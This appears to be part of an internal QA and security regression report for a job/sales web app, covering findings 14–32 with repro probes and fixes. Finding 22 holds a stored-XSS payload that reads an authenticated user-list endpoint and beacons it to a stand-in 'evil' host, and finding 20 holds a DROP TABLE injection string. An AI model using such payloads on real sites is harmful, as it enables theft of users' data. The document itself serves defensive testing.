fetch('/api/v1/pipeline/73617d28-a631-46d5-bc45-934c9b135cfc', {
  method: 'PATCH', credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({stage: 'TOTALLY_FAKE_STAGE_XYZ_REGRESSION'})
})
// → 200 OK; card.stage == "TOTALLY_FAKE_STAGE_XYZ_REGRESSION"
```

Expected: **400 Bad Request** with `"Invalid stage. Must be one of: new_lead, researching, qualified, outreach, engaged, disqualified"` — exactly what `POST /api/v1/pipeline` already does via `_get_stage_keys(db)` at `pipeline.py:310-312`.

**Fix:** mirror the same check inside `update_client` — before assigning `client.stage = body.stage`, verify `body.stage in await _get_stage_keys(db)`; else raise `HTTPException(400, …)`.

The probe card was PATCHed back to `researching` immediately after testing.

---

### 14. Resume upload does not validate file content
**Severity:** 🟡 MEDIUM · **Area:** `POST /api/v1/resume/upload`

1. Plain-text body with `.pdf` extension and fake `application/pdf` MIME:
   ```js
   const fd = new FormData();
   fd.append('file', new Blob(['just plain text'], {type: 'application/pdf'}), 'spoofed.pdf');
   fetch('/api/v1/resume/upload', {method: 'POST', body: fd, credentials: 'include'})
   // → 200 OK; resume persisted: word_count: 0, status: "error", is_active: false
   ```

2. Empty 0-byte file (`new Blob([''], {type: 'application/pdf'})`) — same 200 OK, persisted.

3. ✅ Oversized (6 MB padded `%PDF` header): correctly rejected with 400 "File size exceeds 5MB limit".

Both garbage records were deleted via `DELETE /api/v1/resume/{id}` → 200 OK.

**Impact:** pollutes `resume` table with unusable entries that still appear in the user's resume list UI. User has to manually delete or IT has to clean.

**Fix:** after saving, attempt `PyPDF2.PdfReader(io.BytesIO(raw))` / `docx.Document(io.BytesIO(raw))`; if it throws, return 400 before commit. Also reject 0-byte files at the boundary (`UploadFile.size == 0`).

---

### 15. Pipeline PATCH has no bounds on priority or notes
**Severity:** 🟡 MEDIUM · **Area:** `PATCH /api/v1/pipeline/{client_id}` (`PipelineUpdate` schema)

```
PATCH {priority: 999999999}     → 200, stored
PATCH {priority: -100}          → 200, stored
PATCH {notes: 'x'.repeat(102400)} → 200, 100 KB stored verbatim
```

Both fields were reset after probing.

XSS probe: `{notes: '<img src=x onerror="window.__PWNED=true">'}` was stored as-is; after navigating to `/pipeline` the script **did not execute** (React escapes text children by default), but the raw string appeared as visible text on the card. Today this is not exploitable — but the unbounded field + stored HTML becomes a persistent-XSS vector the moment anything downstream uses `dangerouslySetInnerHTML` on notes.

**Fix:** on `schemas/pipeline.py`, add `priority: int = Field(default=0, ge=0, le=100)` and `notes: str = Field(default='', max_length=4000)`.

---

### 16. Feedback GET returns 500 for non-UUID path
**Severity:** 🟠 HIGH (a 500 is a server-error breadcrumb — should be a 4xx) · **Area:** `GET /api/v1/feedback/{feedback_id}` (`backend/app/api/v1/feedback.py:274`)

```
GET /api/v1/feedback/not-a-uuid   → 500 Internal Server Error   ❌
GET /api/v1/jobs/not-a-uuid        → 422 Unprocessable Entity   ✅
GET /api/v1/companies/not-a-uuid   → 422 Unprocessable Entity   ✅
```

Root cause: `feedback_id: str` at `feedback.py:276` (also 292, 115, 162). `db.get(Feedback, "not-a-uuid")` bubbles a Postgres cast error up as a 500.

**Fix:** change the path-param annotations to `feedback_id: UUID` and import `from uuid import UUID`. Pydantic will then auto-422 for malformed UUIDs.

---

### 17. Himalayas fetcher hard-caps at 1020 jobs per scan
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/fetchers/himalayas.py:62-63`

```python
# Safety limit — fetch up to 1000 jobs per scan
if offset > 1000:
    break
```

Last 3 scans (`GET /api/v1/platforms/scan-logs?platform=himalayas&limit=3`):
```
jobs_found: 1020, new_jobs: 931, duration_ms: 30660
jobs_found: 1020, new_jobs: 617, duration_ms: 20568
jobs_found: 1020, new_jobs: 933, duration_ms: 22647
```

Identical `jobs_found` with fluctuating `new_jobs` implies the Himalayas catalog is >1020 and each scan grabs a slightly different subset of the head. This is the structural driver behind part of **Finding #7** (himalayas 180 accumulated errors) — we likely keep re-inserting/updating the same ~1020 rows while the tail is never seen.

**Fix options:**
1. Lift the cap (e.g. to 5000) if latency stays acceptable — simplest.
2. Switch to incremental pagination: persist the highest `pubDate` we saw, only fetch newer-than that next scan.
3. Keep the cap, but rotate the `offset` seed per run so we cycle through the catalog.

---

### 18. `/jobs?search=Stripe` returns 3 but Stripe has 61 jobs
**Severity:** 🟡 MEDIUM · **Area:** search routing / deployment integrity

```
GET /api/v1/companies?search=stripe
  → {total: 1, items: [{name: "Stripe", job_count: 61}]}
GET /api/v1/jobs?company_id=89619c2c-46d4-470e-a696-0292e4936ec1
  → {total: 61}     ✅ direct company filter works
GET /api/v1/jobs?search=Stripe
  → {total: 3}      ❌ only title matches come through
GET /api/v1/jobs?search=Stripe&status=all
  → {total: 0}      ❌ default-status override breaks results entirely
```

Commit `212830a` added `Job.company.has(Company.name.ilike(...))` at `jobs.py:76`, which should return all 61. Either:
- The backend container hasn't been rebuilt / redeployed yet (fix is in git, not on the running process).
- `joinedload(Job.company)` is fine, but the EXISTS subquery behind `has()` might hit a different Company row than expected (e.g. jobs whose `company_id` points to a company named "Stripe, Inc." vs "Stripe").

**Next step:** hit `/api/v1/monitoring/health` (or similar) to confirm the deployed commit SHA; if it still shows `b2cb1d4` / pre-fix, trigger a redeploy first. If it already says `212830a`, add a server-side log of the generated SQL to see why the `has()` branch returns 0.

Also: the `status=all` permutation going to **0** (not 3) is suspicious — looks like `status=all` is treated as a literal enum value by the handler rather than as "no filter". Worth a separate look at `jobs.py:56-57`.

---

### 19. Missing defensive response security headers
**Severity:** 🔵 LOW · **Area:** HTTP response headers (origin + Cloudflare edge)

`curl -sI https://salesplatform.reventlabs.com/api/v1/auth/me`:
```
✅ x-content-type-options: nosniff
✅ x-frame-options: SAMEORIGIN
✅ x-xss-protection: 1; mode=block
✅ referrer-policy: strict-origin-when-cross-origin
❌ Content-Security-Policy                       (missing)
❌ Strict-Transport-Security                     (missing)
❌ Permissions-Policy                            (missing)
❌ Cross-Origin-{Opener,Embedder,Resource}-Policy (missing)
```

Login-cookie flags (from `POST /api/v1/auth/login`):
`Set-Cookie: session=…; HttpOnly; Max-Age=86400; Path=/; SameSite=lax; Secure` ✅

The JWT is also echoed in the JSON body (not just the cookie), but `Object.keys(localStorage)` is `[]` after login — so the frontend does not persist it anywhere JS-reachable. Fine.

**Fix (cheap):** add HSTS + a starter CSP at the Cloudflare edge (Rules → Transform Rules → HTTP Response Header Modification). Start CSP in `Content-Security-Policy-Report-Only` mode so we don't break the existing bundle.

---

### 20. Role-cluster `name` accepts arbitrary characters
**Severity:** 🔵 LOW · **Area:** `POST /api/v1/role-clusters`

Probe:
```
POST /api/v1/role-clusters
{ "name": "test'); DROP TABLE role_cluster_config;--",
  "display_name": "x", "keywords": "test", "approved_roles": "" }
→ 200 OK; name stored as "test');_drop_table_role_cluster_config;--"
```

Not SQLi (SQLAlchemy params are safe). But `name` is used as a URL query value (e.g. `/jobs?role_cluster=<name>`) and as a key in UI state — punctuation, whitespace, or quotes silently surviving normalization will bite us later.

**Fix:** in `schemas/role_config.py`, restrict `name` via `Field(..., pattern=r'^[a-z0-9][a-z0-9_-]{1,30}$')` so the cluster key stays URL-safe.

Test cluster was deleted via `DELETE /api/v1/role-clusters/<id>` → 200 OK.

---

## 12. Observations from the retest (no finding, FYI)

- **RBAC sanity:** as `admin`, `/users` and `/auth/register` correctly return 403; `/role-clusters` POST correctly allowed. OK.
- **UUID handling:** `/jobs/not-a-uuid` → 422, `/companies/not-a-uuid` → 422, `/pipeline/{non-uuid}/stage` → 404. Consistent except feedback (Finding 16).
- **Pagination bounds:** `page=0` → 422, `page=999999999` → 200 with empty items + correct `total_pages`, `page_size=-1` → 422, `page_size=9999` → 422 (clamped at 200). Sensible.
- **Silent sort fallback:** `sort_by=malicious_column` → 200 with default sort (first_seen_at). Safe but no error signal — consider 422 for unknown sort columns.
- **Finding #10 retest:** the "1name" card still exists at id `73617d28-a631-46d5-bc45-934c9b135cfc` with `total_open_roles: 123, accepted_jobs_count: 1, stage: researching`. Awaiting the data-cleanup task the fixer flagged.

---

## 13. Round 3 Findings (2026-04-15, post-deploy retest + new probes)

Context: after the fixer announced "Changes deployed on prod" (commit `212830a`
plus `6205733`), the tester re-verified Round-1 fixes and continued with deeper
probes. All Round-1 fixes pass re-test. All side-effects from new probes were
reverted (probe feedback tickets resolved with `[regression test cleanup]` note,
attachments deleted, status PATCHes restored to original).

### Round-1 fix retest (all ✅ on prod)

| # | Probe | Prod result | Verdict |
|---|---|---|---|
| 2 | `GET /analytics/overview` vs `GET /companies?per_page=1` | both return `6638` | ✅ fixed |
| 4 | `GET /jobs?search=Bitwarden` → 17 items · `search=Stripe` → 61 items (matches `companies.job_count`) | fixed | ✅ fixed (supersedes Finding #18) |
| 6 | `GET /analytics/trends?days=7` returns both `day/total` AND aliased `date/new_jobs/count` keys | no NaN | ✅ fixed |
| 11 | Duplicate POST with same title within 7d → `409` + `existing_feedback_id` | correct | ✅ fixed |
| 12 | AI-insight now says "10 ATS sources" (was "6") | improved — **but still mismatches `/platforms` which shows 14**; tracked as new Finding #28 | 🟡 partial |

---

### 21. Unauthenticated file access via feedback attachment endpoint
**Severity:** 🔴 BLOCKER · **Area:** `backend/app/api/v1/feedback.py:193-201`

```python
@router.get("/attachments/{filename}")
async def get_attachment(filename: str):      # ← NO Depends(get_current_user)
    safe_name = Path(filename).name
    file_path = UPLOAD_DIR / safe_name
    if not file_path.exists():
        raise HTTPException(404, "File not found")
    return FileResponse(file_path)
```

Reproduced on prod:
1. Admin creates a feedback ticket + uploads `probe.png` → stored filename `3ae9b021c4c841738b74deecff3d6f2f.png`.
2. `curl …/api/v1/feedback/attachments/3ae9b021c4c841738b74deecff3d6f2f.png` **without any cookie** → `HTTP 200, 70 bytes` (file served).
3. Viewer user (`test-viewer@`) downloads same file → `HTTP 200, 70 bytes` (byte-identical).
4. `diff` against the admin download: **IDENTICAL**.

Directory traversal is correctly blocked (`Path(filename).name` strips dirs — `../../etc/passwd` → 404).

**Impact:** users attach screenshots / PDFs of internal screens, resumes, or bug context to tickets thinking it's private. The 32-char hex filenames are hard to guess, but are logged in nginx access logs, leak via Referer headers if anyone clicks a link out, appear in the feedback JSON (exposed to anyone who can list any feedback), etc. A `viewer` role is explicitly allowed to see another user's attachment today.

**Fix:** add `user: User = Depends(get_current_user)` to the signature. Then check that the feedback row referencing this filename belongs to `user.id` (or user is admin/super_admin). Simplest:
```python
async def get_attachment(filename: str, user: User = Depends(get_current_user), db: AsyncSession = Depends(get_db)):
    # Find the feedback that owns this attachment
    result = await db.execute(select(Feedback).where(Feedback.attachments.like(f'%"filename": "{filename}"%')))
    fb = result.scalar_one_or_none()
    if not fb or (fb.user_id != user.id and user.role not in ("admin","super_admin")):
        raise HTTPException(404, "File not found")
    # …serve file…
```

Probe attachment + feedback ticket were deleted after testing.

**✅ Fix applied** (`feedback.py:193-228`): endpoint now declares `user: User = Depends(get_current_user)` and `db: AsyncSession = Depends(get_db)`. Before returning the `FileResponse`, we ILIKE-scan `Feedback.attachments` for the exact `"filename": "<name>"` fragment to find the owning ticket; request is rejected 404 if unlinked, 403 if the caller is neither the ticket author nor admin/super_admin. Directory-traversal hardening (`Path(filename).name`) retained.

---

### 22. Stored DOM-XSS via third-party ATS HTML in JobDetailPage
**Severity:** 🔴 BLOCKER · **Area:** `frontend/src/pages/JobDetailPage.tsx:386-396` + `backend/app/api/v1/jobs.py:276-278`

```tsx
{description.raw_text.includes("<") ? (
  <div
    className="prose prose-sm max-w-none text-gray-700"
    dangerouslySetInnerHTML={{ __html: description.raw_text }}   // ← stored ATS HTML
  />
) : (
  <div className="prose prose-sm max-w-none text-gray-700 whitespace-pre-wrap">
    {description.raw_text}
  </div>
)}
```

`raw_text` comes directly from the ATS response (`raw_json.content` from Greenhouse, `descriptionHtml` from Ashby, etc.). The backend further **HTML-unescapes** it at `jobs.py:276-278`, so any platform that escaped `<` as `&lt;` in its API response has that protection actively *removed* by our code before we inject it into the DOM.

Why this matters:
- An attacker posting a job on any supported ATS can include `<img src=x onerror=fetch('/api/v1/users',{credentials:'include'}).then(r=>r.json()).then(d=>navigator.sendBeacon('//evil/',JSON.stringify(d)))>`.
- Any authenticated user who opens that job detail page runs the attacker's JS on our origin.
- `HttpOnly` cookie blocks `document.cookie` access, but `fetch` with `credentials:'include'` works fine — the attacker can call any authenticated endpoint (list all contacts, patch pipeline, create admin feedback, etc.).
- We confirmed existing prod job descriptions are full of legitimate HTML (`<p>`, `<ul>`, etc.) — so we can't just strip all tags, but we MUST sanitize.

Verified injection path is live: the real first job's `raw_text.len = 14988` and contains `<`, i.e. hits the dangerous branch.

**Fix:** add `dompurify` (~20 KB) and sanitize before setting innerHTML:
```tsx
import DOMPurify from 'dompurify';
…
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(description.raw_text, {
  ALLOWED_TAGS: ['p','br','ul','ol','li','strong','em','b','i','u','h1','h2','h3','h4','h5','h6','a','code','pre','blockquote'],
  ALLOWED_ATTR: ['href','title'],
  ALLOWED_URI_REGEXP: /^(https?|mailto):/i,
}) }}
```
Also remove the backend `html_mod.unescape` at `jobs.py:276-278` — it's actively making things worse.

**✅ Fix applied** (backend, no frontend dep needed): added `backend/app/utils/sanitize.py` with `sanitize_html()` built on BeautifulSoup (already a dep). Both `raw_text` return paths in `jobs.py` (the stored `JobDescription` branch *and* the `raw_json` fallback that follows `html_mod.unescape`) now pass their text through `sanitize_html()` before returning it to the frontend. The sanitizer:

- **Hard-drops** `<script>`, `<style>`, `<iframe>`, `<embed>`, `<object>`, `<applet>`, `<link>`, `<meta>`, `<form>`, `<input>`, `<button>`, `<svg>`, `<noscript>`, etc. — along with their children.
- **Unwraps** anything not in a conservative allowlist (`<p>`, `<br>`, `<ul>`, `<ol>`, `<li>`, `<a>`, `<strong>`, headings, tables, etc.) — keeps the text, drops the tag.
- **Drops every `on*` attribute** (onclick, onload, onerror, …) and any attribute not in the allowlist.
- **Drops `href` / `src`** whose scheme is not `http:`, `https:`, `mailto:`, `/`, or `#` (i.e. kills `javascript:`, `data:`, `vbscript:`, `file:`).
- **Forces `<a>` tags** to `rel="noopener noreferrer nofollow"` + `target="_blank"`.

Frontend `JobDetailPage.tsx` still uses `dangerouslySetInnerHTML`, but the input is now trusted-safe from the backend. Kept `html_mod.unescape()` — it runs *before* sanitization, so escaped payloads like `&lt;script&gt;` are decoded and then stripped by `sanitize_html()` in the same pass.

---

### 23. Password hashing uses unstretched SHA-256 with a global salt
**Severity:** 🔴 BLOCKER · **Area:** `backend/app/api/v1/auth.py:36-43`

```python
def _hash_password(password: str) -> str:
    """SHA-256 hash with salt from jwt_secret. For production use bcrypt instead."""
    salted = f"{settings.jwt_secret}:{password}"
    return hashlib.sha256(salted.encode()).hexdigest()

def _verify_password(password: str, password_hash: str) -> bool:
    return _hash_password(password) == password_hash
```

Problems (three):
1. **Single-round SHA-256.** Designed to be fast. A 4090 does ~10 Gh/s — 10-char passwords fall in hours.
2. **Global salt** (`jwt_secret`), not per-user. Two users with the same password have identical hashes. Rainbow tables become viable once the secret leaks.
3. **Non-constant-time compare** (`==`). Even at SHA-256 speeds, the timing side-channel is small-but-real — should use `hmac.compare_digest`.

The code itself admits the issue: `"""For production use bcrypt instead."""` — but prod is using this.

**Fix:** migrate to `bcrypt` / `argon2-cffi` with lazy upgrade:
```python
from passlib.hash import bcrypt
def _hash_password(p): return bcrypt.using(rounds=12).hash(p)
def _verify_password(p, h):
    # First try bcrypt; fall back to the legacy SHA-256 and upgrade on next login
    if h.startswith("$2"): return bcrypt.verify(p, h)
    legacy = hashlib.sha256(f"{settings.jwt_secret}:{p}".encode()).hexdigest()
    return hmac.compare_digest(legacy, h)
```
On successful legacy verify, re-hash with bcrypt and update `user.password_hash` in the same transaction. After a migration window, drop the fallback.

---

### 24. No rate limiting / lockout on login endpoint
**Severity:** 🟠 HIGH · **Area:** `backend/app/api/v1/auth.py:60-90`

Probes:
- 25 consecutive wrong-password POSTs in 15s: all accepted (mix of 401s and transient 503s). No 429, no Retry-After, no account-lock flag on the user row.
- Immediately after: valid creds log in fine. No IP-ban, no email alert.
- Under burst, the backend starts returning 503 (queue exhaustion, likely because each login does a DB roundtrip + a password hash on the request thread) — but this is a side effect, not a defence.

Combined with Finding #23 (fast hashing), this makes **online** credential stuffing viable. Even with bcrypt, we'd still want a limiter.

**Fix:** add `slowapi` (FastAPI-friendly wrapper over limits). Typical rule: 10 login attempts per IP per 15 min, 5 failed attempts per email per hour. Either return 429 immediately or inject a 1-5s delay. Also add an `auth_failures` counter on `User` and lock at 10 consecutive fails (unlock after 1h or via admin).

---

### 25. Feedback schema has no max_length on free-text fields
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/schemas/feedback.py`

```python
class FeedbackCreate(BaseModel):
    title: str = Field(..., min_length=5, max_length=200)    # ✅ bounded
    description: str = Field(..., min_length=20)              # ❌ no max
    steps_to_reproduce: str | None = None                     # ❌
    expected_behavior: str | None = None                      # ❌
    actual_behavior: str | None = None                        # ❌
    use_case: str | None = None                               # ❌
    proposed_solution: str | None = None                      # ❌
    impact: str | None = None                                 # ❌
    screenshot_url: str | None = None                         # ❌ also no URL check
```

Verified: `POST /feedback` with `description = 'A' * 1_000_000` → **HTTP 200**, stored. The 1MB ticket was cleaned up.

**Impact:** DB bloat, network bandwidth, UI render jank (a 1MB description in the card preview). `screenshot_url` accepting `javascript:` is a footgun if the field is ever rendered via `<a href>` or inline image.

**Fix:** `description: str = Field(..., min_length=20, max_length=10_000)` (and similar on siblings). For `screenshot_url`, use `pydantic.HttpUrl` or `Field(pattern=r'^https?://…')`.

---

### 26. Intelligence → Timing posting_by_day is massively skewed to Sunday
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/api/v1/intelligence.py` (timing endpoint) + upstream `Job.posted_at`/`first_seen_at`

`GET /api/v1/intelligence/timing` → `posting_by_day`:
```
Sunday    23696  50.3%   ← anomalous
Monday     6496  13.8%
Tuesday    5456  11.6%
Wednesday  4169   8.8%
Thursday   3020   6.4%
Friday     2384   5.1%
Saturday   1921   4.1%
```
Half of all jobs are posted on Sunday? Far more likely that jobs with missing `posted_at` fall back to `first_seen_at`, and the first bulk import / weekly backfill happened on a Sunday, skewing the "day of week" aggregation.

**Fix:** investigate the aggregation SQL. If it's using `EXTRACT(DOW FROM COALESCE(posted_at, first_seen_at))`, switch to `EXTRACT(DOW FROM posted_at)` and filter out `NULL posted_at` explicitly. If the data genuinely has no real `posted_at` for those 23k rows, the "post on Sundays" recommendation this page emits is garbage — hide the card or add a "low data quality" disclaimer.

---

### 27. Intelligence → Networking returns corrupted contact fields
**Severity:** 🟡 MEDIUM · **Area:** `GET /api/v1/intelligence/networking` + upstream contact ingestion

First suggestion returned on prod:
```json
{
  "name": "Gartner PeerInsights",
  "title": "Wade BillingsVP, Technology Services, Instructure",
  "company": "BugCrowd",
  "email": "gartner.peerinsights@bugcrowd.com",
  "is_decision_maker": true,
  "open_roles": 31,
  "top_relevance_score": 98.0
}
```

Multiple signals of broken ingestion:
- `name` is a product name ("Gartner PeerInsights"), not a person.
- `title` has two glued values: `"Wade Billings" + "VP, Technology Services, Instructure"` with no space.
- `company` says `"BugCrowd"` but title mentions `"Instructure"` — contact is probably from Instructure listed against the wrong company.
- `email` was synthesized as `{slugified name}@{company domain}` → `gartner.peerinsights@bugcrowd.com` — plausibly a catch-all but definitely not a real person's inbox.

**Impact:** sales team gets presented with decision-maker outreach suggestions with wrong names, wrong companies, wrong emails. Worst-case we email the wrong person at the wrong company with a personalized note referencing another company. Reputational + deliverability damage.

**Fix:** audit the contact ingestion pipeline — where is `name` vs `title` being split? `email_status: "catch_all"` suggests the synthesizer is aware the email is unverified but still surfacing it as a high-relevance suggestion (98.0). At minimum, filter `email_status == "catch_all"` out of the default suggestions list, and add a sanity check that `name` is two tokens (first/last) without commas/colons.

---

### 28. AI Insight "10 ATS sources" mismatches Platforms page "14"
**Severity:** 🟡 MEDIUM · **Area:** `backend/app/api/v1/analytics.py:130` (`total_sources` computation) vs `/api/v1/platforms`

- `GET /analytics/ai-insights` → insight text: *"Platform has 47,081 jobs indexed across **10** ATS sources."*
- `GET /api/v1/platforms` → 14 distinct platforms: `ashby, bamboohr, greenhouse, himalayas, jobvite, lever, linkedin, recruitee, remoteok, remotive, smartrecruiters, wellfound, weworkremotely, workable`.

Gap of 4: `bamboohr, recruitee, wellfound, weworkremotely` all have boards in the DB but 0 current `jobs` rows (Finding #7 lists three of these as stuck at 0). `COUNT(DISTINCT jobs.platform)` therefore returns 10.

The Finding #12 fix moved the number from `6 → 10` (good), but the user-facing comparison is still off by 4 because two different queries back the two numbers. A platform row with an active board but temporarily 0 jobs is still "a source" from the user's perspective.

**Fix:** change `total_sources` to `COUNT(DISTINCT company_ats_boards.platform WHERE is_active = true)` — i.e. source "what we monitor" rather than "what produced a job row today". This also matches the Platforms page, which the user sees right next to the insight card.

---

### 29. Feedback stats cards omit "Closed" → Total does not reconcile
**Severity:** 🔵 LOW · **Area:** `frontend/src/pages/FeedbackPage.tsx` stats row

At `/feedback` the summary cards show:
```
Total 33   ·   Open 16   ·   In Progress 0   ·   Resolved 12
```
But `GET /feedback/stats.by_status` returns `{open: 16, in_progress: 0, resolved: 12, closed: 5}`. 16+0+12 = 28 ≠ 33. The 5 `closed` tickets exist and are selectable via the status dropdown, but there's no stat card for them — users can't reconcile the Total without opening the filter.

**Fix:** add a fourth card `Closed X` (or combine Resolved+Closed into a single `Done X` card). Cheap win.

---

### 30. "Update Ticket" has no button styling + no success toast
**Severity:** 🔵 LOW · **Area:** ticket-detail modal in `frontend/src/pages/FeedbackPage.tsx`

- "Update Ticket" is rendered as plain black text next to the Status dropdown — no border, no background, no hover state visible. Accessibility tree confirms it is a `<button>`, but visually it reads as a label.
- On click, PATCH goes through and the modal closes, but there is no toast/snack confirming success. New users may click twice, or assume nothing happened.

Functionality is correct (`PATCH /feedback/{id}` → 200, status and notes persist, stats cards update in real time — verified end-to-end on prod with the "Search Bar" ticket, then reverted).

**Fix:** style the button (use the existing `Button variant="primary"` component). Wire up the existing toast system (`sonner` / `react-hot-toast` — whichever ships with the app) on `mutation.onSuccess`.

---

### 31. Legacy duplicate "Resume Score / Relevance" tickets still present
**Severity:** 🟡 MEDIUM · **Area:** data cleanup (not code)

Finding #11 prevents **new** duplicates — but the original 8 identical `Resume Score / Relevance` tickets from `khushi.jain@reventlabs.com` (submitted 4/14, all status=open) are still in the queue. Current open list has the dupes pre-dating the fix and clutters the admin view.

Listed open tickets (2026-04-15, admin filter status=open, total 16):
```
[MEDIUM] 4edaefed · improvement     · Search Bar                          · khushi.jain@
[MEDIUM] e93fabd0 · improvement     · Problem of Filter Stickness         · khushi.jain@
[   LOW] 750b7716 · bug             · Testing                             · aditya.bambal@
[MEDIUM] e0115437 · bug             · Testing                             · aditya.bambal@
[MEDIUM] e46d2820 · bug             · Testing                             · aditya.bambal@
[MEDIUM] 58e6e669 · improvement     · Problem of Filter Stickness         · khushi.jain@   ← dupe of e93fabd0
[MEDIUM] c9f184ad · improvement     · Resume Score / Relevance            · khushi.jain@   ↓ 8 dupes
[MEDIUM] 4ef54eee · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] a0c81e13 · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] f660c03c · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] 4449f64a · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] 936f130c · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] 2085b342 · improvement     · Resume Score / Relevance            · khushi.jain@
[MEDIUM] ab888c64 · improvement     · Resume Score / Relevance            · khushi.jain@
[   LOW] 878fd009 · bug             · API test screenshot URL check       · admin@jobplatform.io
[MEDIUM] ce73c529 · improvement     · Search Bar Query                    · khushi.jain@
```

Recommended cleanup (one-off SQL, with admin approval):
```sql
-- Keep the first (oldest) Resume Score ticket from khushi.jain, close the rest
UPDATE feedback SET status='closed', admin_notes=COALESCE(admin_notes,'') || ' [auto-closed as dup of earliest]'
 WHERE user_id = (SELECT id FROM users WHERE email='khushi.jain@reventlabs.com')
   AND title = 'Resume Score / Relevance' AND status = 'open'
   AND id NOT IN (
     SELECT id FROM feedback WHERE user_id=(SELECT id FROM users WHERE email='khushi.jain@reventlabs.com')
      AND title='Resume Score / Relevance' AND status='open' ORDER BY created_at LIMIT 1
   );
-- Same for Problem of Filter Stickness (2 copies)
UPDATE feedback SET status='closed' WHERE id='58e6e669-…';
-- Delete obvious "Testing" tickets from aditya.bambal@
DELETE FROM feedback WHERE user_id=(SELECT id FROM users WHERE email='aditya.bambal@reventlabs.com')
  AND title='Testing' AND status='open';
```

Verify counts after: `/feedback/stats.by_status.open` should drop from 16 → about 6.

---

## 14. Round 4 Findings (2026-04-15, re-retest + UI/UX deep audit)

### 32. Round 3 fixes marked ✅ are not actually live on prod
**Severity:** 🔴 BLOCKER · **Area:** Deploy / Release

While starting a Round 4 UI/UX audit I re-probed each Round 3 finding that the branch marks ✅ fixed. Most of them are still reproducing on prod. The code on `fix/regression-findings` is correct, but that code has not been rolled out — prod is running an image that predates commits `85bfa77` / `ba19e50` / `9bdc572` / `34f57b4` / `32d970f` / `d24d2a9`.

Concrete evidence (all as `test-admin@reventlabs.com` on `https://salesplatform.reventlabs.com`):

| Finding | Expected after fix | Observed on prod |
|---|---|---|
| #16 | `GET /feedback/not-a-uuid` → **422** (structured validation error) | **500 Internal Server Error** |
| #21 | `GET /feedback/attachments/<filename>` without cookie → **401** | **HTTP 200 + raw PNG bytes** (reproduced by uploading `probe21.png` as admin then `curl` with no cookies). The endpoint still has no auth check live |
| #25 | `POST /feedback` with 20,000-char `description` → **422** (max_length=8000) | **HTTP 200** — ticket created with 20 KB payload (also 8,001 and 5,000; all accepted) |
| #26 | `/intelligence/timing.posting_by_day` — Sunday ≈ 1/7 of total (posted_at based) | Sunday=23,696 (49.6%), Mon=6,496, …, Sat=1,921 — identical to pre-fix distribution |
| #27 | `/intelligence/networking` strips corrupted rows | First suggestion is still `{name: "Gartner PeerInsights", title: "Wade BillingsVP, Technology Services, Instructure", company: "BugCrowd"}` — the canonical example the filter is supposed to drop |
| #28 | Dashboard AI Insight: "indexed across **14** ATS sources" | "indexed across **10** ATS sources" (`/analytics/ai-insights` still returns `total_sources=10`) |
| #19 | Response headers include `Content-Security-Policy`, `Strict-Transport-Security`, `Permissions-Policy`, `Cross-Origin-*` | Only `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`. CSP & HSTS both absent — and X-Frame-Options is SAMEORIGIN, not `DENY` as the fix specifies |

Fixes that **are** live (confirmed earlier in Round 3 retest): #1, #2, #3, #4, #5, #6, #8, #9, #11, #13, #14. Those all shipped in earlier commits that pre-date the "deployed on prod" manual deploy.

#### Why this happened
Commit `5ce5d0b` added a GHCR-based CI/CD pipeline that auto-deploys **only on push to `main`**. All Round 3 fixes live on `fix/regression-findings`, which never gets picked up by CI. Whoever deployed "Changes … deployed on prod" earlier today ran a one-time manual deploy at roughly the tip before `9bdc572`. Every fix commit after that point is in the repo but not in the image running on prod.

#### Repro (most striking probe, #21 anonymous download)
```bash
# 1. Log in as admin in the browser; create a fresh feedback ticket; upload probe21.png
# 2. Note the stored filename, e.g. e66bae2db9e3467e9b960197caa0c2ed.png
curl -s -o out.png -w "HTTP %{http_code}\n" \
  "https://salesplatform.reventlabs.com/api/v1/feedback/attachments/e66bae2db9e3467e9b960197caa0c2ed.png"
# expected: HTTP 401
# actual:   HTTP 200  (followed by the full PNG bytes)
```
Compare to a control endpoint that does require auth:
```bash
curl -s -w "HTTP %{http_code}\n" https://salesplatform.reventlabs.com/api/v1/feedback/stats
# HTTP 401 {"detail":"Not authenticated"}  ← as expected
```
Only `/feedback/attachments/{filename}` lets unauthenticated callers through, which matches the pre-fix code on `main` where `get_current_user` was never wired into this route.

#### Side-effect cleanup
All Round-4 probe tickets (`test round 4 long desc`, `regression probe attachment auth round4`, `probe 25 5000 / 8001 / 20000`, `Attach auth probe 2026-04-15`) were PATCHed to `status=closed` with `admin_notes="[regression cleanup round 4]"`. Uploaded probe PNG was deleted from the ticket. No user-visible rows remain.

#### Suggested fix
(a) Easiest: manually redeploy the branch image now so the tester can continue. `docker compose -f docker-compose.yml pull && docker compose up -d` on the prod box after pointing the backend image to the tip of `fix/regression-findings`.
(b) Properly: extend `.github/workflows/*.yml` to build + push an image on pushes to `fix/*` branches and, at minimum, post a deployable image tag in the PR so ops can redeploy with one command. Even better: preview-image-per-PR.
(c) Until either lands: every Round-3 `✅ fixed` row in §1 above should actually be read as "fixed on branch, not yet verified on prod".

---

## 15. Round 4 In-Flight Notes

This section will be fleshed out with UI/UX findings after the deployment gap above is resolved. Auditing pages against a stale image would double-count bugs the fixer has already closed on the branch.

**End of report.**
